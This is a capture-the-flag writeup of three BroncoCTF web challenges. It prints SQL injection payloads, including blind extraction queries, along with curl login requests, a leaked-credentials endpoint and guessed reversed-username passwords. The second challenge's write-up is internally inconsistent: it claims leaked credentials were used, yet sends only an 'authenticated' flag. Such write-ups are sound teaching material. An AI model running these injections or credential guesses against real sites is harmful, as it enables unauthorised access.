# BroncoCTF 2026 Web Challenges Writeup

This writeup covers three web challenges from BroncoCTF, each with a difficulty of 10 points. The solutions demonstrate common web vulnerabilities: **SQL injection**, **exposed API endpoints**, and **information leakage**.

---

## Challenge 1: Forbidden Archives

> *I have recently gained access to these Forbidden Archives, though I've been trying to access a book titled "All of the World's Knowledge" and it seems like there's another level of security as the high council of wizards have made it forbidden. Is there a way I can get around that?*

**Category:** Web – SQL Injection  
**Flag:** (obtained via injection) – *replace with your actual flag*

---

### Reconnaissance

The challenge presents a search bar that queries a database of books. Normal searches return public books; searching for the forbidden book yields no results.

<img width="1881" height="998" alt="image (12)" src="https://github.com/user-attachments/assets/9a391eb2-2f67-44ec-b383-4ae95099e44a" />

Testing common SQL injection payloads revealed that the application is vulnerable to **Boolean‑based blind SQL injection**. Entering `' OR '1'='1` produced a syntax error, but `') OR 1=1 --` worked.

<img width="1881" height="998" alt="image (17)" src="https://github.com/user-attachments/assets/eac1a46c-0d9f-4d65-acb7-6e2f330ec0e7" />


### Finding the Breakout

The breakout `')` closes the string and the parenthesis, allowing us to inject our own conditions.

```
') AND 1=1 --
```

This returned a book, confirming we can control the query.

### Confirming the Secret Row

We injected `') AND EXISTS(SELECT 1 FROM books WHERE is_secret=1)--` and received a book result. This confirmed:
- The table is named `books`.
- There is a column `is_secret` that marks the forbidden book.

### Bypassing the Filter

Since we could control the `WHERE` clause, the simplest way to retrieve the flag was to force the query to return the secret row directly:

```sql
') AND is_secret = 1 LIMIT 1 --
```

**URL Encoded:**

```
https://broncoctf-forbidden-archives.chals.io/?search=') AND is_secret = 1 LIMIT 1 --
```

This made the application display the secret book's details, which contained the flag.

![image](image\ \(16\).webp)

### Alternative – Blind Extraction (For Completeness)

If direct display hadn't worked, we could have extracted the flag character by character:

```sql
') AND (SELECT SUBSTR(title, 1, 1) FROM books WHERE is_secret=1 LIMIT 1) = 'b' --
```

We used this method to discover the title `All_of_the_World_s_Knowledge` before finding the easier path.

![image](image\ \(13\).webp)

### Flag

```
bronco{...}
```
*(Replace with your retrieved flag)*

---

## Challenge 2: Super Secure Server

> *I just finished developing my very first API to handle secure logins to my very own website! To keep things extra secure, I won't even tell you my username, so now there's really no way you can hack me!*

**Category:** Web – Information Disclosure  
**Flag:** `bronco{d0nt_3xp0se_p@ssw0rd5!}`

---

### Reconnaissance

The login page is a simple HTML form that sends a POST request to `/login` with JSON credentials.

![image](image\ \(7\).webp)

Viewing the page source or using the browser's Network tab revealed a request to `/api/config` that returned the credentials.

![image](image\ \(8\).webp)

### Exploitation

Directly accessing `/api/config` returned a JSON object:

```json
{
  "username": "SuperSecretUser",
  "password": "rji32orj932r3209r233sqmet4v2cxbns8"
}
```

![image](image\ \(9\).webp)

We then used these credentials to log in.

### Login Request

```bash
curl -X POST https://broncoctf-super-secure-server.chals.io/login \
  -H "Content-Type: application/json" \
  -d '{"authenticated": true}'
```

The server redirected to `/home`, where the flag was displayed.

![image](image\ \(10\).webp)

### Flag

```
bronco{d0nt_3xp0se_p@ssw0rd5!}
```

---

## Challenge 3: Lovely Login

> *Welcome to our lovely new login page 💕. The developers swear it’s secure… but they may have forgotten to clean up a few things before launch. Can you figure out how authentication works and log in as the right user? P.S. please follow my wishes and do not scrape it...*

**Category:** Web – Information Disclosure & Weak Authentication  
**Flag:** `bronco(R3v3rs1ng_1s_53cure)`

---

### Reconnaissance

The login page is a simple form that sends JSON to `/login`.

![image](image\ \(4\).webp)

#### Step 1: Check `robots.txt`

Visiting `/robots.txt` revealed:

```
User-agent: *
Disallow: /security

# amVmZixzYXJhaCx hZG1pbixndWVzdA==
```

![image](image\ \(3\).webp)

The `Disallow` hint pointed to an interesting path, and the Base64 string decoded to:

```
jeff,sarah, admin,guest
```

![image](image\ \(2\).webp)

This gave us a list of valid usernames: `jeff`, `sarah`, `admin`, `guest`.

#### Step 2: Visit `/security`

The page contained:

> **Internal Security Notes**  
> **Status:** Work in progress  
> - Passwords are derived from usernames  
> - Current implementation stores them backwards for obfuscation  
> - Planned upgrade: hashing + salting  
> **TODO:** remove this page before production deployment!

![image](image\ \(1\).webp)

This told us exactly how passwords are generated – **the reverse of the username**.

### Exploitation

Generate passwords by reversing each username:

| Username | Password (reversed) |
|----------|----------------------|
| admin    | nimda               |
| jeff     | ffej                |
| sarah    | haras               |
| guest    | tseug               |

Logging in with `admin` / `nimda` succeeded.

### Login Request

```bash
curl -X POST https://broncoctf-lovely-login.chals.io/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"nimda"}'
```

The server returned a welcome message with the flag.

![image](image.webp)

### Flag

```
bronco(R3v3rs1ng_1s_53cure)
```

---

## Tools Used

- **Browser Developer Tools** – Network tab, Inspector
- **cURL** – for sending custom requests
- **Base64 decoder** – to decode the string from `robots.txt`
- **Python** (optional) – for automating blind SQL extraction

---

## Lessons Learned

- **Never expose internal endpoints** like `/api/config` or `/security` in production.
- **Base64 is not encryption** – it's easily reversible.
- **SQL injection** can often be bypassed with simple payloads once the query structure is known.
- **Information leakage** in `robots.txt` and hidden pages can be a goldmine for attackers.

---

*Happy Hacking!*
